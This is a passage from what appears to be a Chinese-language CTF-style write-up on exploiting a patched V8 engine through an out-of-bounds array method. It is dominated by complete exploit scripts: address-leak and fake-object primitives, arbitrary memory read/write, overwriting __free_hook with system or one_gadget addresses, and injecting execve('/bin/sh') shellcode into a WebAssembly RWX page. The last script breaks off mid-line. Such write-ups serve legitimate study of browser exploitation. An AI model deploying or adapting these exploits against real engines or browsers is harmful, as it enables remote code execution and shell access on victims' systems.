+<p>调试可以发现, dataview直接操作缓冲区的指针是这样的<code>DataView.buffer.backing_store</code>, 这个地方存储直接指向buffer的指针, 也就是说, 我们只需要控制这个指针, 就可以直接写入内容了</p>
+<p>步骤:<br>通过<code>addressOf</code>leak出dataview, 计算buffer的偏移, <code>read64</code>leak出buffer的值,<br>计算<code>backing_store</code>的地址通过write64写入想写入的地址</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> dv=<span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line">dv_address=addressOf(dv);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] DataView@"</span>+tos(dv_address));</span><br><span class="line">buffer_address=dv_address+<span class="number">0x18</span>n; <span class="comment">//offset</span></span><br><span class="line">tp=read64(buffer_address)<span class="number">-1</span>n+<span class="number">0x20</span>n;  <span class="comment">//offset</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] buffer_value@"</span>+tos(tp));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_dataview</span>(<span class="params">address,value</span>)</span>&#123;</span><br><span class="line">	write64(tp,address);</span><br><span class="line">	dv.setFloat64(<span class="number">0</span>,i2f(value),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">write_dataview(free_hook,system);</span><br></pre></td></tr></table></figure>
+
+<p>我这里写入了一个system, 所以还需要写入一个<code>/bin/sh\x00</code>来调用</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getshell</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">let</span> buff=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line">	<span class="keyword">let</span> dv1=<span class="keyword">new</span> <span class="built_in">DataView</span>(buff);</span><br><span class="line">	dv1.setFloat64(<span class="number">0</span>,i2f(<span class="number">0x0068732f6e69622f</span>n),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">getshell();</span><br></pre></td></tr></table></figure>
+
+<p>完整exp</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buff_area = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> fl = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buff_area);</span><br><span class="line"><span class="keyword">var</span> ui = <span class="keyword">new</span> BigUint64Array(buff_area);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">floo</span>)</span>&#123;</span><br><span class="line">    fl[<span class="number">0</span>] = floo;</span><br><span class="line">    <span class="keyword">return</span> ui[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">intt</span>)</span>&#123;</span><br><span class="line">    ui[<span class="number">0</span>] = intt;</span><br><span class="line">    <span class="keyword">return</span> fl[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tos</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"0x"</span>+data.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj=&#123;<span class="string">'a'</span>:<span class="number">1</span>&#125;;</span><br><span class="line">obj_array=[obj];</span><br><span class="line">f_array=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak maps</span></span><br><span class="line">obj_array_type=obj_array.oob();</span><br><span class="line">f_array_type=f_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] obj_array_type@"</span>+tos(f2i(obj_array_type)));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] f_array_type@"</span>+tos(f2i(f_array_type)));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">	obj_array[<span class="number">0</span>]=obj_to_leak;</span><br><span class="line">	obj_array.oob(f_array_type);</span><br><span class="line">	<span class="keyword">let</span> obj_addr=f2i(obj_array[<span class="number">0</span>])<span class="number">-1</span>n;</span><br><span class="line">	<span class="comment">// type of 1n: bigint</span></span><br><span class="line">	obj_array.oob(obj_array_type);</span><br><span class="line">	<span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">address</span>)</span>&#123;</span><br><span class="line">	<span class="comment">// address is integer and align to 0x8</span></span><br><span class="line">	f_array[<span class="number">0</span>]=i2f(address+<span class="number">1</span>n);</span><br><span class="line">	f_array.oob(obj_array_type);</span><br><span class="line">	<span class="keyword">let</span> tmp_obj=f_array[<span class="number">0</span>];</span><br><span class="line">	f_array.oob(f_array_type);</span><br><span class="line">	<span class="keyword">return</span> tmp_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_obj_build=[</span><br><span class="line">	f_array_type,</span><br><span class="line">	i2f(<span class="number">0</span>n),</span><br><span class="line">	i2f(<span class="number">0x4141414141414141</span>n),</span><br><span class="line">	i2f(<span class="number">0x400000000</span>n),</span><br><span class="line">	<span class="number">1.1</span>,</span><br><span class="line">	<span class="number">2.2</span></span><br><span class="line">];</span><br><span class="line"><span class="comment">// when we only use 4 elements, </span></span><br><span class="line"><span class="comment">// something strange in objects layout</span></span><br><span class="line"></span><br><span class="line">fake_obj_addr=addressOf(fake_obj_build)<span class="number">-0x30</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] fake_obj_addr@"</span>+tos(fake_obj_addr));</span><br><span class="line">fake_obj=fakeObject(fake_obj_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">address</span>)</span>&#123;</span><br><span class="line">	fake_obj_build[<span class="number">2</span>]=i2f(address+<span class="number">1</span>n<span class="number">-0x10</span>n);</span><br><span class="line">	readin=f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">	<span class="comment">// console.log("[*] read: "+tos(readin));</span></span><br><span class="line">	<span class="keyword">return</span> readin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">address,value</span>)</span>&#123;</span><br><span class="line">	fake_obj_build[<span class="number">2</span>]=i2f(address+<span class="number">1</span>n<span class="number">-0x10</span>n);</span><br><span class="line">	fake_obj[<span class="number">0</span>]=i2f(value);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"[*] write: "</span></span><br><span class="line">		+tos(address)</span><br><span class="line">		+<span class="string">" =&gt; "</span></span><br><span class="line">		+tos(value));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test=[<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> start_addr=addressOf(test)<span class="number">-0xb000</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(tos(start_addr))</span><br><span class="line"><span class="keyword">var</span> leak=<span class="number">0</span>n;</span><br><span class="line"><span class="comment">// i=2;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="comment">// 1d8:0ec0│   0xe2b86d80ec0 —▸ 0x5555557f13a0 ◂— push   rbp</span></span><br><span class="line">	start_addr-=<span class="number">8</span>n;</span><br><span class="line">	leak=read64(start_addr);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"[*] "</span>+tos(start_addr)+<span class="string">" =&gt; "</span>+tos(leak));</span><br><span class="line">	<span class="keyword">if</span>((((start_addr&amp;<span class="number">0xfff</span>n)==<span class="number">0xed0</span>n)&amp;&amp;<span class="number">0x3a0</span>n==(leak&amp;<span class="number">0xfff</span>n)))&#123; </span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"[+] find proc: "</span>+tos(leak));</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">leak-=<span class="number">0x29d3a0</span>n;</span><br><span class="line">free_got=<span class="number">0x00000d99ec8</span>n+leak;</span><br><span class="line"></span><br><span class="line">libc=read64(free_got)<span class="number">-0x844f0</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] libc@"</span>+tos(libc));</span><br><span class="line">free_hook=<span class="number">0x3c67a8</span>n+libc;</span><br><span class="line">system=libc+<span class="number">0x45390</span>n;</span><br><span class="line"><span class="comment">// write64(free_hook,system);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> dv=<span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line">dv_address=addressOf(dv);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] DataView@"</span>+tos(dv_address));</span><br><span class="line">buffer_address=dv_address+<span class="number">0x18</span>n;</span><br><span class="line">tp=read64(buffer_address)<span class="number">-1</span>n+<span class="number">0x20</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] buffer_value@"</span>+tos(tp));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_dataview</span>(<span class="params">address,value</span>)</span>&#123;</span><br><span class="line">	write64(tp,address);</span><br><span class="line">	dv.setFloat64(<span class="number">0</span>,i2f(value),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">write_dataview(free_hook,system);</span><br><span class="line"><span class="comment">// %DebugPrint(test);</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getshell</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">let</span> buff=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line">	<span class="keyword">let</span> dv1=<span class="keyword">new</span> <span class="built_in">DataView</span>(buff);</span><br><span class="line">	dv1.setFloat64(<span class="number">0</span>,i2f(<span class="number">0x0068732f6e69622f</span>n),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">getshell();</span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br></pre></td></tr></table></figure>
+
+<p>或者我们可以尝试直接写one_gadget</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">one=libc+<span class="number">0x4526a</span>n;</span><br><span class="line">write_dataview(free_hook,one);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">one=libc+<span class="number">0xf02a4</span>n;</span><br><span class="line">write_dataview(malloc_hook,one);</span><br></pre></td></tr></table></figure>
+
+<p>总之就是常规堆利用套路即可</p>
+<h4 id="利用WebAssembly执行Shellcode"><a href="#利用WebAssembly执行Shellcode" class="headerlink" title="利用WebAssembly执行Shellcode"></a>利用WebAssembly执行Shellcode</h4><p>相对上面来说, 我觉得这个玩意才是正道=.=</p>
+<blockquote>
+<p>简单来说，wasm就是可以让JavaScript直接执行高级语言生成的机器码的一种技术</p>
+</blockquote>
+<p><a href="https://wasdk.github.io/WasmFiddle/" target="_blank" rel="noopener">这个</a>网站可以将C语言直接转换为wasm(TQL)</p>
+<p>这个窗口也很简单</p>
+<blockquote>
+<p>左上: C代码<br>左下: wasm的格式<br>右上: 调用方法<br>右下: 输出</p>
+</blockquote>
+<p>我们可以自己跑跑试试</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line">f=wasmInstance.exports.main;</span><br><span class="line"><span class="built_in">console</span>.log(f());</span><br></pre></td></tr></table></figure>
+
+<p>可以看到输出了42</p>
+<p>为了安全性考虑, wasm是不能执行系统调用的命令的, 只能是一些运算相关的函数, 才能够调用. 不过我们现在已经有任意地址读和写了, 所以我们就有以下思路</p>
+<blockquote>
+<p>首先加载一段wasm代码到内存中<br>然后通过addresssOf原语找到存放wasm的内存地址<br>接着通过任意地址写原语用shellcode替换原本wasm的代码内容<br>最后调用wasm的函数接口即可触发调用shellcode</p>
+</blockquote>
+<p>如何找到code存放的位置(同时他也是RWE的区段)</p>
+<p><code>执行函数的地址.shared_info.data.instance</code><br><code>addressOf(f)+0x18# +0x8# +0x10#</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line">f=wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">func_addr=addressOf(f);</span><br><span class="line">share_info_addr=func_addr+<span class="number">0x18</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"share_info_addr@"</span>+tos(share_info_addr));</span><br><span class="line">share_info=read64(share_info_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"share_info@"</span>+tos(share_info));</span><br><span class="line">data_addr=share_info+<span class="number">8</span>n<span class="number">-1</span>n;</span><br><span class="line">data=read64(data_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"data@"</span>+tos(data));</span><br><span class="line">instance_addr=data+<span class="number">0x10</span>n<span class="number">-1</span>n;</span><br><span class="line">instance=read64(instance_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"instance@"</span>+tos(instance));</span><br><span class="line">shellcode_addr=read64(instance+<span class="number">0x88</span>n<span class="number">-1</span>n);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"shellcode_addr@"</span>+tos(shellcode_addr));</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就获得了shellcode的地址, 也就是RWE的段, 接下来我们通过任意地址写, 将shellcode写入, 然后调用wasm的接口即可</p>
+<p>这里注意一点, 为了防止我们写入shellcode的过程像上面写libc的时候一样失败, 我们这里同样的构造了dataview来进行连续的写入的过程</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6a</span>n,</span><br><span class="line">    <span class="number">0x5368732f6e69622f</span>n,</span><br><span class="line">    <span class="number">0x050f5e5457525f54</span>n</span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> buff=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">32</span>);</span><br><span class="line"><span class="keyword">var</span> dv=<span class="keyword">new</span> <span class="built_in">DataView</span>(buff);</span><br><span class="line"></span><br><span class="line">target_addr=read64(addressOf(dv)+<span class="number">0x18</span>n)<span class="number">-1</span>n+<span class="number">0x20</span>n;</span><br><span class="line"></span><br><span class="line">write64(target_addr,shellcode_addr);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;shellcode.length;i++)&#123;</span><br><span class="line">	dv.setFloat64(i*<span class="number">8</span>,i2f(shellcode[i]),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
+
+<p>完整exp</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buff_area = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> fl = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buff_area);</span><br><span class="line"><span class="keyword">var</span> ui = <span class="keyword">new</span> BigUint64Array(buff_area);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">floo</span>)</span>&#123;</span><br><span class="line">    fl[<span class="number">0</span>] = floo;</span><br><span class="line">    <span class="keyword">return</span> ui[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">intt</span>)</span>&#123;</span><br><span class="line">    ui[<span class="number">0</span>] = intt;</span><br><span class="line">    <span class="keyword">return</span> fl[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tos</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"0x"</span>+data.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj=&#123;<span class="string">'a'</span>:<span class="number">1</span>&#125;;</span><br><span class="line">obj_array=[obj];</span><br><span class="line">f_array=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak maps</span></span><br><span class="line">obj_array_type=obj_array.oob();</span><br><span class="line">f_array_type=f_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] obj_array_type@"</span>+tos(f2i(obj_array_type)));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] f_array_type@"</span>+tos(f2i(f_array_type)));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">	obj_array[<span class="number">0</span>]=obj_to_leak;</span><br><span class="line">	obj_array.oob(f_array_type);</span><br><span class="line">	<span class="keyword">let</span> obj_addr=f2i(obj_array[<span class="number">0</span>])<span class="number">-1</span>n;</span><br><span class="line">	<span class="comment">// type of 1n: bigint</span></span><br><span class="line">	obj_array.oob(obj_array_type);</span><br><span class="line">	<span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">address</span>)</span>&#123;</span><br><span class="line">	<span class="comment">// address is integer and align to 0x8</span></span><br><span class="line">	f_array[<span 